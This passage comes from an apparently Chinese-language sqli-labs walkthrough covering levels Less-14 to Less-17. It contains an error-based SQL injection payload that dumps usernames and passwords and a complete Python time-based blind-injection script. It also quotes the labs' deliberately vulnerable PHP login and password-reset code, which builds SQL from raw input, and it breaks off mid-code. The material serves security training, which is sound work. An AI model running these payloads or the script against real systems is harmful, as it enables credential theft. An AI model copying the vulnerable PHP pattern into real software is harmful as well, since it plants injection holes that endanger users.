		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Try again looser";</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
	<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> 
	@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=<span class="token interpolation"><span class="token variable">$uname</span></span> and password=<span class="token interpolation"><span class="token variable">$passwd</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "#0000ff">';	</span>
  		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo " You Have successfully logged in " ;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token comment">//echo 'Your Login name:'. $row['username'];</span>
		<span class="token comment">//echo "&lt;br>";</span>
		<span class="token comment">//echo 'Your Password:' .$row['password'];</span>
		<span class="token comment">//echo "&lt;br>";</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg" />'</span><span class="token punctuation">;</span>	
		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Try again looser";</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"  />'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>Python（盲注）:</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys

<span class="token comment"># config-start</span>
sleep_time <span class="token operator">=</span> <span class="token number">1</span>
error_time <span class="token operator">=</span> <span class="token number">0.1</span>
<span class="token comment"># config-end</span>

<span class="token keyword">def</span> <span class="token function">getPayload</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span> indexOfChar<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># admin' or ()-- </span>
    column_name<span class="token operator">=</span><span class="token string">"password"</span>
    table_name<span class="token operator">=</span><span class="token string">"username"</span>
    database_name<span class="token operator">=</span><span class="token string">"users"</span>
    payload <span class="token operator">=</span> <span class="token string">"((ascii(substring((select "</span> <span class="token operator">+</span> column_name <span class="token operator">+</span> <span class="token string">" from "</span> <span class="token operator">+</span> database_name <span class="token operator">+</span> <span class="token string">"  limit "</span> <span class="token operator">+</span> indexOfResult <span class="token operator">+</span> <span class="token string">",1),"</span> <span class="token operator">+</span> indexOfChar <span class="token operator">+</span> <span class="token string">",1)))="</span> <span class="token operator">+</span> mid <span class="token operator">+</span> <span class="token string">")"</span><span class="token comment">#此处更改sql语句</span>
    payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span><span class="token string">"' or (("</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">") and sleep("</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sleep_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"))-- "</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">exce</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>queryASCII<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># content-start</span>
    url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:801/sqli/Less-15/"</span>
    postData <span class="token operator">=</span> getPayload<span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">,</span>queryASCII<span class="token punctuation">)</span>
    before_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>postData<span class="token punctuation">)</span>
    after_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># content-end</span>
    use_time <span class="token operator">=</span> after_time <span class="token operator">-</span> before_time
    <span class="token comment"># judge-start</span>
    <span class="token comment"># 当sleep函数被执行 , 说明查询是正确的 (因为穷举毕竟错误的情况更多 , 要构造SQL语句让正确的情况执行sleep函数从而提高效率)</span>
    <span class="token comment"># 当使用二分查找的时候 , 控制正确/错误的时候执行sleep函数就不那么重要了</span>
    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>use_time<span class="token punctuation">)</span> <span class="token operator">></span> error_time<span class="token punctuation">:</span> 
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token comment"># judge-end</span>

<span class="token keyword">def</span> <span class="token function">doSearch</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">,</span>indexOfChar<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 根据数据库中出现的字符的频率顺序重新构造列表进行查询</span>
    order <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'!'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> queryChar <span class="token keyword">in</span> order<span class="token punctuation">:</span>
        queryASCII <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>queryChar<span class="token punctuation">)</span>
        <span class="token keyword">if</span> exce<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>indexOfResult<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>indexOfChar <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>queryASCII<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>queryASCII<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 需要遍历的查询结果的数量</span>
        counter <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 结果的长度</span>
            counter <span class="token operator">+=</span> <span class="token number">1</span>
            temp <span class="token operator">=</span> doSearch<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token comment"># 从255开始查询</span>
            <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># 当为1的时候说明已经查询结束</span>
                <span class="token keyword">break</span>
            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> counter <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># 当结果集的所有行都被遍历后退出</span>
            <span class="token keyword">break</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

search<span class="token punctuation">(</span><span class="token punctuation">)</span>
代码来源：https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>e5a42373ed12</code></pre>


<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "#0000ff">';	</span>
  		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo " You Have successfully logged in\n\n " ;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token comment">//echo 'Your Login name:'. $row['username'];</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token comment">//echo 'Your Password:' .$row['password'];</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"  />'</span><span class="token punctuation">;</span>	
		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Try again looser";</span>
		<span class="token comment">//print_r(mysql_error());</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>把Less-15脚本SQL语句中前面的” ‘ “换成” “) “即可</p>
<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//including the Mysql connect parameters.</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//检查是否为空</span>
		<span class="token punctuation">&#123;</span>
		<span class="token comment">// truncation (see comments)</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//截取前面15个字符</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Stripslashes if magic quotes enabled</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//此方法当magic_quotes_gpc开启时所有的 ' (单引号)、" (双引号)、\（反斜杠）和 NULL字符都会被一个反斜杠自动转义。 但在php5.4起已经被放弃，始终返回false</span>
		<span class="token punctuation">&#123;</span>
			<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除反斜杠</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Quote if not a number</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//纯数字检测</span>
		<span class="token punctuation">&#123;</span>
			<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span> <span class="token operator">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token comment">//mysql_real_escape_string对字符串中的特殊字符进行转义，会被进行转义的字符包括： NULL（ASCII 0），\n，\r，\，'，" 和 Control-Z. </span>
		<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取变量的整数值</span>
		<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token comment">// take the variables</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">//making sure uname is not injectable</span>
	<span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//uname被check_input了，详见上面的代码</span>

	<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">//logging the connection parameters to a file for analysis.</span>
	<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'User Name:'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'New Password:'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// connectivity </span>
	@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//echo $row;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "#0000ff">';	</span>
		<span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  	
		<span class="token comment">//echo 'Your Login name:'. $row1;</span>
		<span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
			<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/br>"</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
			<span class="token comment">//echo " You password has been successfully updated " ;		</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag1.jpg"   />'</span><span class="token punctuation">;</span>	
		<span class="token comment">//echo 'Your Password:' .$row['password'];</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
